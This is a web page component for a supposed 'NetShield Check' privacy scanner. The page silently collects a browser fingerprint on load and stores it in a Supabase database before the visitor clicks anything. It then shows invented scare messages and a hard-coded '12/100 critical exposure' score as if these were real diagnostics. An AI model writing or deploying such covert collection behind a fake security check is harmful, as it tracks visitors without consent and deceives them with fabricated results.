'use client';
import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import Scanner from '@/components/Scanner';
import { collectFingerprint } from '@/lib/fingerprint';
import { Shield, Smartphone, Globe, AlertTriangle } from 'lucide-react';

// --- CONFIG ---
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY = process.env.NEXT_PUBLIC_SUPABASE_KEY;

// Check valid config
const isConfigured = SUPABASE_URL && SUPABASE_URL.startsWith('http') && SUPABASE_KEY;
const supabase = isConfigured ? createClient(SUPABASE_URL!, SUPABASE_KEY!) : null;

export default function Home() {
    const [status, setStatus] = useState<'IDLE' | 'SCANNING' | 'RESULT'>('IDLE');
    const [data, setData] = useState<any>(null);
    const [errorMsg, setErrorMsg] = useState<string | null>(null);

    // Auto-start collection on mount as requested
    useEffect(() => {
        startScan(true); // silent start
    }, []);

    const startScan = async (silent = false) => {
        if (!silent) setStatus('SCANNING');

        // Basic config check
        if (!supabase) {
            // Allow UI to run in demo mode but warn
            if (!silent) console.warn("Supabase not configured. Data will NOT be saved.");
        }

        try {
            const fp = await collectFingerprint();
            setData(fp);

            // Only send if configured
            if (supabase) {
                const { error } = await supabase.from('fingerprints').insert([{
                    json_data: fp,
                    user_agent: fp.userAgent,
                    ip_address: '0.0.0.0'
                }]);
                if (error) console.error("Supabase error:", error.message);
            }

        } catch (e: any) {
            console.error("Collection failed", e);
            setErrorMsg(e.message);
        }
    };

    return (
        <main className="min-h-screen bg-cyber-bg text-cyber-text font-mono flex flex-col relative overflow-hidden bg-grid-pattern bg-[size:40px_40px]">

            {/* Header */}
            <header className="p-6 border-b border-white/10 flex justify-between items-center backdrop-blur-sm bg-black/50 z-10 w-full">
                <div className="flex items-center gap-2 text-cyber-primary">
                    <Shield size={24} />
                    <span className="font-bold tracking-wider">NETSHIELD CHECK</span>
                </div>
                <div className="flex items-center gap-2 text-xs text-cyber-muted">
                    {status === 'SCANNING' ? (
                        <>
                            <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></div>
                            <span>ANALYZING...</span>
                        </>
                    ) : (
                        <>
                            <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse"></div>
                            <span>LIVE MONITORING</span>
                        </>
                    )}
                </div>
            </header>

            {/* Main Content */}
            <div className="flex-1 flex flex-col items-center justify-center p-4 z-10 w-full">

                {/* Warning Banner if No Config */}
                {!isConfigured && (
                    <div className="mb-4 p-2 bg-red-900/50 border border-red-500 text-red-200 text-xs rounded">
                        ⚠️ SETUP REQUIRED: Configure .env.local with Supabase keys to save data.
                    </div>
                )}

                {status === 'IDLE' && (
                    <div className="text-center space-y-8 max-w-2xl animate-fade-in">
                        <h1 className="text-4xl md:text-6xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-500">
                            Is Your Device Spying On You?
                        </h1>
                        <p className="text-xl text-cyber-muted">
                            We've detected tracking beacons on this network. <br />
                            Check your <span className="text-cyber-primary">Digital Surveillance Score</span> immediately.
                        </p>
                        <button
                            onClick={() => setStatus('SCANNING')}
                            className="group relative px-8 py-4 bg-cyber-primary/10 text-cyber-primary border border-cyber-primary rounded hover:bg-cyber-primary hover:text-black transition-all duration-300 font-bold text-lg tracking-widest uppercase"
                        >
                            <span className="relative z-10 flex items-center gap-2">
                                <Shield size={20} /> CHECK NOW
                            </span>
                            <div className="absolute inset-0 bg-cyber-primary/20 blur-xl group-hover:opacity-100 opacity-0 transition-opacity" />
                        </button>
                        <div className="mt-8 grid grid-cols-3 gap-4 text-xs text-cyber-muted opacity-50">
                            <div>Hardware Fingerprint</div>
                            <div>Audio Context Leaks</div>
                            <div>Worker Scope Integrity</div>
                        </div>
                    </div>
                )}

                {status === 'SCANNING' && (
                    <Scanner onComplete={() => setStatus('RESULT')} />
                )}

                {status === 'RESULT' && data && (
                    <div className="w-full max-w-2xl animate-fade-in">
                        <div className="mb-8 text-center">
                            <div className="inline-flex items-center justify-center w-24 h-24 rounded-full border-4 border-cyber-danger text-cyber-danger mb-4 bg-cyber-danger/10">
                                <span className="text-3xl font-bold">12/100</span>
                            </div>
                            <h2 className="text-3xl font-bold text-cyber-danger">CRITICAL EXPOSURE</h2>
                            <p className="text-cyber-muted">Your digital footprint is highly unique and trackable.</p>
                        </div>

                        <div className="grid md:grid-cols-2 gap-4 mb-8">
                            <div className="p-4 bg-cyber-panel border border-white/10 rounded">
                                <div className="flex items-center gap-2 text-cyber-primary mb-2">
                                    <Smartphone size={16} /> Device Identity
                                </div>
                                <div className="text-sm font-mono text-gray-400">
                                    OS: {data.platform} <br />
                                    Cores: {data.hardwareConcurrency} <br />
                                    WebGL: {data.webgl.renderer ? 'Detected' : 'Hidden'}
                                </div>
                            </div>
                            <div className="p-4 bg-cyber-panel border border-white/10 rounded">
                                <div className="flex items-center gap-2 text-cyber-primary mb-2">
                                    <Globe size={16} /> Connection
                                </div>
                                <div className="text-sm font-mono text-gray-400">
                                    Timezone: {data.timezone} <br />
                                    Worker Scope: {data.worker ? 'Inconsistent' : 'verified'} <br />
                                    Canvas: Unique Hash
                                </div>
                            </div>
                        </div>

                        <div className="p-4 bg-cyber-primary/5 border border-cyber-primary/20 rounded text-center">
                            <div className="flex items-center justify-center gap-2 text-cyber-primary mb-2">
                                <AlertTriangle size={18} />
                                <span className="font-bold">Recommendation</span>
                            </div>
                            <p className="text-sm text-gray-300 mb-4">
                                Your browser leaks significant hardware identifiers (AudioContext, WebGL).
                                Ordinary VPNs cannot hide this.
                            </p>
                            <button onClick={() => window.location.reload()} className="text-xs underline text-cyber-muted hover:text-white">
                                Run Diagnostics Again
                            </button>
                        </div>
                    </div>
                )}

            </div>

            <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-cyber-primary/5 via-transparent to-transparent pointer-events-none" />
        </main>
    );
}
